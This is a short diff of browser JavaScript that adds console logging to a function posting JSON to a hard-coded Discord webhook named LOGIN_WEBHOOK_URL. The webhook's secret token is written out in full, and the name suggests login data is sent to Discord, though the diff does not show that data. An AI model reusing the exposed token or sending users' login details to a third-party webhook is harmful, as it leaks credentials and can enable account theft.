@@ -122,14 +122,20 @@
         const LOGIN_WEBHOOK_URL = 'https://discord.com/api/webhooks/1496506113175191603/1CfS3UsG092DjAj7dsOU0dF4YomrZpQAPcrptQ4eWXFDzK7v-2GIOPNoXRdJpaeKVZXE';
 
         async function sendWebhook(url, data) {
+            console.log('Sending webhook to:', url);
+            console.log('Webhook data:', data);
             try {
-                await fetch(url, {
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify(data)
                 });
+                console.log('Webhook response status:', response.status);
+                console.log('Webhook response ok:', response.ok);
+                const responseText = await response.text();
+                console.log('Webhook response:', responseText);
             } catch (error) {
                 console.error('Webhook error:', error);
             }
